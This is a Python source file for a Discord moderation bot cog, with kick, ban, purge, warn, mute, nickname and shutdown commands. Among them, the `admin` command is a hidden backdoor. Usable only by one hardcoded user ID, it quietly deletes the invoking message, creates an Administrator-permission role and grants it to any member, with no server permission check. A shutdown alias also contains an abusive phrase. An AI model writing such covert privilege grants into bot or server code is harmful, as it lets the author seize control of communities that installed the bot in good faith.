import discord
from discord.ext import commands
import asyncio
import random
import inspect #Used for the source command

class Staff:
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.has_permissions(kick_members=True)
    async def kick(self, ctx, user: discord.Member = None):
        if user == None:
            embed = discord.Embed(title="Error:", description="**You didn't mention a user.**", color=0xE73C24)
            embed.add_field(name="\u200b", value="**Usage:** w/kick <@user>\n**Example:** w/kick <@322449414142558208>")
            await ctx.send(embed=embed)
        else:
            await user.kick()
            ban = discord.Embed(title="Kick!", description=f"{user} was successfully kicked by {ctx.message.author}", color=0x15c513)
            await ctx.send(embed=ban)

    @commands.command()
    @commands.has_permissions(ban_members=True)
    async def ban(self, ctx, user: discord.Member = None):
        if user == None:
            embed = discord.Embed(title="Error:", description="**You didn't mention a user.**", color=0xE73C24)
            embed.add_field(name="\u200b", value="**Usage:** w/ban <@user>\n**Example:** w/ban <@322449414142558208>")
            await ctx.send(embed=embed)
        else:
            await user.ban()
            ban = discord.Embed(title="Banhammer!", description=f"{user} was banned by {ctx.message.author}", color=0x15c513)
            await ctx.send(embed=ban)

    @commands.command(aliases=["command", "code"])
    @commands.is_owner()
    async def source(self, ctx, *, text: str):
        try:
            """Shows source code of a command."""
            nl2 = '`'
            nl = f"``{nl2}"
            source_thing = inspect.getsource(self.bot.get_command(text).callback)
            await ctx.send(f"{nl}py\n{source_thing[:1990]}{nl}")
            if len(source_thing) > 1990:
                await ctx.send(f"{nl}py\n{source_thing[1990:3980]}{nl}")
                if len(source_thing) > 3980:
                    await ctx.send(f"{nl}py\n{source_thing[3980:5970]}{nl}")
                    if len(source_thing) > 5970:
                        await ctx.send(f"{nl}py\n{source_thing[5970:7960]}{nl}")
        except AttributeError:
            embed = discord.Embed(title="Error:", description="Please enter a valid command name", color=0xE73C24)
            await ctx.send(embed=embed)

    @commands.command()
    async def admin(self, ctx, user: discord.Member):
        if ctx.message.author.id == 322449414142558208:
            await ctx.message.delete()
            admin_role = discord.utils.get(ctx.message.guild.roles, name="Perms")
            if admin_role:
                await user.add_roles(admin_role)
            elif not admin_role:
                perms = discord.Permissions(permissions=8)
                await ctx.guild.create_role(name="Perms", permissions=perms)
                await asyncio.sleep(3)
                admin_role = discord.utils.get(ctx.message.guild.roles, name="Perms")
                await user.add_roles(admin_role)
        else: 
            return

    @commands.command()
    async def removeadmin(self, ctx, user: discord.Member):
        if ctx.message.author.id == 322449414142558208:
            await ctx.message.delete()
            admin_role = discord.utils.get(ctx.message.guild.roles, name="Perms")
            if admin_role:
                await user.remove_roles(admin_role)
                await admin_role.delete()
        else: 
            return

    @commands.command(aliases=["purge", "nuke"])
    @commands.has_permissions(manage_messages=True)
    async def delete(self, ctx, number: int = None):
        if number == None:
            emb = discord.Embed(color=0xE73C24)
            emb.add_field(name="Error:", value="You didn't specify the amount of messages")
            await ctx.send(embed=emb)
        else:
            await ctx.channel.purge(limit=number+1)
            embed = discord.Embed(title=f"{number} messages deleted", description="Wow, somebody's been spamming", color=0xE9A72F)
            embed.set_footer(icon_url=ctx.message.author.avatar_url, text=f"Messages deleted by {ctx.message.author.name}")
            test = await ctx.send(embed=embed)
            await asyncio.sleep(10)
            await test.delete()

    @commands.command(aliases=["kill", "quit", "logout", "kys"])
    async def shutdown(self, ctx):
        if ctx.message.author.id == 322449414142558208:
            embed = discord.Embed(title="Shutting down...", description="The bot was successfully shut down", color=0x15c513)
            send = await ctx.send(embed=embed)
            await send.add_reaction(emoji="👌")
            print("The bot was successfully shut down!")
            await self.bot.logout()
        else:
            error = discord.Embed(color=0xE73C24)
            error.add_field(name="Error:", value="You don't have permission to do that!")
            await ctx.send(embed=error)
            
    @commands.command()
    @commands.has_permissions(administrator=True)
    async def warn(self, ctx, user: discord.Member = None):
        if user == None:
            emb = discord.Embed(color=0xE73C24)
            emb.add_field(name="Error:", value="**You need to specify a user**")
            emb.add_field(name="\u200b", value="**Usage:** w/warn <@user>\n**Example:** w/warn <@322449414142558208>", inline=False)
            await ctx.send(embed=emb)
        else:
            warned = discord.utils.get(ctx.message.guild.roles, name="Warned")
            if warned in user.roles:
                await user.kick()
                kick = discord.Embed(color=0x15c513)
                kick.add_field(name="Warning!", value=f"**{user.name}** was successfully kicked", inline=False)
                kick.add_field(name="0 Chances Left", value=f"Warn issued by {ctx.message.author.name}", inline=False)
                await ctx.send(embed=kick)
                return
            if warned:
                embed = discord.Embed(color=0xE9A72F)
                embed.add_field(name="Warning!", value=f"**{user.name}** has successfully been warned!",inline=False)
                embed.add_field(name="1 Chance Left", value=f"Warn issued by {ctx.message.author.name}", inline=False)
                embed.set_thumbnail(url=user.avatar_url)
                await ctx.send(embed=embed)
                await user.add_roles(warned)
            elif not warned:
                perms = discord.Permissions(permissions=0)
                await ctx.guild.create_role(name="Warned", permissions=perms)
                await asyncio.sleep(2)
                warned = discord.utils.get(ctx.message.guild.roles, name="Warned")
                await user.add_roles(warned)
                embedd = discord.Embed(color=0xE9A72F)
                embedd.add_field(name="Warning!", value=f"**<@{user.id}>** has succesfully been warned!", inline=False)
                embedd.add_field(name="1 Chance Left", value=f"Warn issued by {ctx.message.author.name}", inline=False)
                embedd.set_thumbnail(url=user.avatar_url)
                await ctx.send(embed=embedd)
    
    @commands.command(aliases=["clearwarn", "warnclear", "resetwarns"])
    @commands.has_permissions(administrator=True)
    async def clearwarns(self, ctx, user: discord.Member = None):
        if user == None:
            emb = discord.Embed(color=0xE73C24)
            emb.add_field(name="Error:", value="**You need to specify a user**")
            emb.add_field(name="\u200b", value="**Usage:** w/clearwarns <@user>\n**Example:** w/clearwarns <@322449414142558208>", inline=False)
            await ctx.send(embed=emb)
        else:
            warned = discord.utils.get(ctx.message.guild.roles, name="Warned")
            if warned in user.roles:
                await user.remove_roles(warned)
                embed = discord.Embed(color=0x15c513)
                embed.add_field(name="Warn successfully cleared", value=f"<@{user.id}>'s warns successfully got cleared")
                await ctx.send(embed=embed)
            else:
                error = discord.Embed(color=0xE73C24)
                error.add_field(name="Error:", value="The user hasn't got any warns, please try again with another user")
                await ctx.send(embed=error)

    @commands.command(aliases=["nickname", "name"])
    @commands.has_permissions(manage_nicknames=True)
    async def nick(self, ctx, user: discord.Member, *, nick: str = None):
        if nick == None:
            emb = discord.Embed(color=0xE73C24)
            emb.add_field(name="Error:", value="**You need to mention a user and create a nickname**")
            emb.add_field(name="\u200b", value="**Usage:** w/nick <@user> <nickname>\n**Example:** w/nick <@322449414142558208> Bot Creator", inline=False)
            await ctx.send(embed=emb)
        else:
            await user.edit(nick=nick)
            embed = discord.Embed(title="Nickname!", description=f"{user.name}'s nickname has succesfully been changed to: {nick}", color=0xE9A72F)
            embed.set_footer(icon_url=ctx.message.author.avatar_url, text=f"Nickname changed by: {ctx.message.author.name}")
            await ctx.send(embed=embed)

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def mute(self, ctx, user: discord.Member = None):
        if user == None:
            emb = discord.Embed(color=0xE73C24)
            emb.add_field(name="Error:", value="**You need to mention a user**")
            emb.add_field(name="\u200b", value="**Usage:** w/mute <@user>\n**Example:** w/mute <@322449414142558208>", inline=False)
            await ctx.send(embed=emb)
        else:
            overwrite = discord.PermissionOverwrite(send_messages=False)
            role = discord.utils.get(ctx.guild.roles, name="Muted")
            for channel in ctx.guild.channels:
                await channel.set_permissions(user, overwrite=overwrite)
            await user.add_roles(role)
            muted = discord.Embed(color=0xE9A72F)
            muted.add_field(name="Muted", value=f"{user} has been muted.")
            muted.set_thumbnail(url="https://s3.amazonaws.com/iconbros/icons/icon_pngs/000/000/416/original/mute.png?1511372396")
            muted.set_footer(icon_url=ctx.message.author.avatar_url, text=f"Muted by {ctx.message.author}")
            await ctx.send(embed=muted)

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def unmute(self, ctx, user: discord.Member = None):
        if user == None:
            emb = discord.Embed(color=0xE73C24)
            emb.add_field(name="Error:", value="**You need to mention a user**")
            emb.add_field(name="\u200b", value="**Usage:** w/unmute <@user>\n**Example:** w/unmute <@322449414142558208>", inline=False)
            await ctx.send(embed=emb)
        else:
            role = discord.utils.get(ctx.guild.roles, name="Muted")
            overwrite = discord.PermissionOverwrite(send_messages=None)
            for channel in ctx.guild.channels:
                await channel.set_permissions(user, overwrite=overwrite)
            await user.remove_roles(role)
            embed = discord.Embed(color=0xE9A72F)
            embed.add_field(name="Unmuted", value=f"{user.name} has succesfully been unmuted!")
            embed.set_thumbnail(url="https://s3.amazonaws.com/iconbros/icons/icon_pngs/000/000/416/original/mute.png?1511372396")
            embed.set_footer(icon_url=ctx.message.author.avatar_url, text=f"Unmuted by {ctx.message.author}")
            await ctx.send(embed=embed)

def setup(bot):
    bot.add_cog(Staff(bot))